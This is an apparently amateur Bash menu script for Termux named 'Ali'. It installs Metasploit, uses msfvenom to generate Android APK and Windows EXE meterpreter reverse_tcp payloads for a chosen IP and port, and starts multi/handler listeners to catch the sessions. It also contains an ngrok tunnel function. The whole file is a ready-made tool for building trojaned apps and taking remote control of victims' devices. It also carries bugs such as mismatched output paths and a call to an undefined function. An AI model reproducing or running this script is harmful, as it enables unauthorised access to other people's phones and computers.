clear
g='\033[1;32m'
p='\033[1;35m'
cyan='\033[1;36m'
green='\033[1;32m'
red='\033[1;31m'
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
reset='\033[0m'
y='\033[1;33m'
echo -e "$cyan"
figlet  -f big " Ali "
ifconfig wlan0 | grep -o 192..........
echo -e " $y      ($g Ali$y ,$p max$y $y )"

echo ""
echo ""
echo -e "                        $p [$y 00$p ]$red EXIT"
echo ""
echo -e "$p [$y 1$p ]$g Download metasploit"
echo -e "$p [$y 2$p ]$g payload  android"
echo -e "$p [$y 3$p ]$g payload  windows"
echo -e "$p [$y 4$p ]$g Android  penetration msf"
echo -e "$p [$y 5$p ]$g windows  penetration msf"
echo ""
echo ""
a00(){


echo -e "    $g    (Good  bye)"



}
a1(){
pkg update
pkg upgrade
pkg install unstable-repo
pkg install metasploit
msfconsole
Alfnan

}
a2(){

g='\033[1;32m'
p='\033[1;35m'
cyan='\033[1;36m'
green='\033[1;32m'
red='\033[1;31m'
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
reset='\033[0m'
y='\033[1;33m'
n=install
echo -e "$blue "
read -p "ip=====> " ip
sleep 2
read -p "port===> " p
sleep 2
read -p "name===> " n
cd
cd metasploit-framework
msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$p R >  /root/max/$n.apk
echo -e " $p  Path of the pyload----->  $yellow  /sdcard/$n.apk"
sleep 2

read -p " --------> entar"
Alfnan
}
a3(){
echo -e "$purple"
read -p "ip=====> " ipp
sleep 2

read -p "port===> " pp
sleep 2
read -p "name===> " nn
cd
cd metasploit-framework
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ipp LPORT=$pp -f exe e >  /root/max/$nn.exe
echo -e "$cyan    Path of the pyload-----> $yellow  /sdcard/$nn.exe"
sleep 2
read -p "-------->entar"
Alfnan



}
a4(){
g='\033[1;32m'
p='\033[1;35m'
cyan='\033[1;36m'
green='\033[1;32m'
red='\033[1;31m'
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
reset='\033[0m'
y='\033[1;33m'
n=install
echo -e "$cyan"
read -p "ip----->" ip
read -p "port---->" port
echo "use exploit/multi/handler" > .msf.rc
echo "set payload android/meterpreter/reverse_tcp" >> .msf.rc
echo "set lhost $ip" >> .msf.rc
echo "set lport $port" >> .msf.rc
echo "exploit" >> .msf.rc
msfconsole -r .msf.rc
}
a5(){
echo -e "$red"
read -p "ip----->" ip
read -p "port---->" port
echo "use exploit/multi/handler" > .msf1.rc
echo "set payloads windows/meterpreter/reverse_tcp" >> .msf1.rc
echo "set lhost $ip" >> .msf1.rc
echo "set lport $port" >> .msf1.rc
echo "exploit" >> .msf1.rc
msfconsole -r .msf1.rc


}

a9(){
cd 
cd ali
./ngrok tcp 4444



}

echo -e "$cyan"
read -p "Number--->   " tool
if [ "$tool" == "1" ]; then
a1


elif [ "$tool" == "2" ]; then
a2

elif [ "$tool" == "3" ]; then
a3
elif [ "$tool" == "4" ]; then
a4
elif [ "$tool" == "5" ]; then
a5
elif [ "$tool" == "00" ]; then
a00
else
echo " $ red ERORR"
sleep 2
Alfnan
fi
